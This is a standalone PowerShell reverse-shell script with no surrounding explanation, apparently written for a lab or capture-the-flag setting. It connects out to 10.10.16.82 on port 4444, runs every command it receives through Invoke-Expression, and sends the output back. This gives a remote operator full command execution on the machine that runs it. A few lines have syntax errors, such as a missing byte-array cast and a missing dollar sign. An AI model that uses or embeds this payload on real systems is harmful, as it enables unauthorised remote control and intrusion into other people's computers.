$client = New-Object System.Net.Sockets.TCPClient("10.10.16.82", 4444);
$stream = $client.GetStream();

$greeting = "Ps " + (pwd).Path + "> ";
$sendbyte = Byte(System.Text.Encoding.ASCII.GetBytes($greeting));
$stream.Write($sendbyte,0,$sendbyte.Length);
$stream.Flush();
[byte[]]$bytes = 0..255 | %{0};



while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
{
    $data = (New-Object -TypeName System.Text.ASCIIENCODING).GetString($bytes, 0, $i);
        $sendback = (iex $data 2>&1 | Out-String);
        $sendback2 = $sendback + "Ps" + (pwd).Path + "> ";
        $sendbyte = Byte(System.Text.Encoding.ASCII.GetBytes($sendback2));
        $stream.Write($sendbyte, 0 , sendbyte.Length);
        $stream.Flush();
};

$client.close();
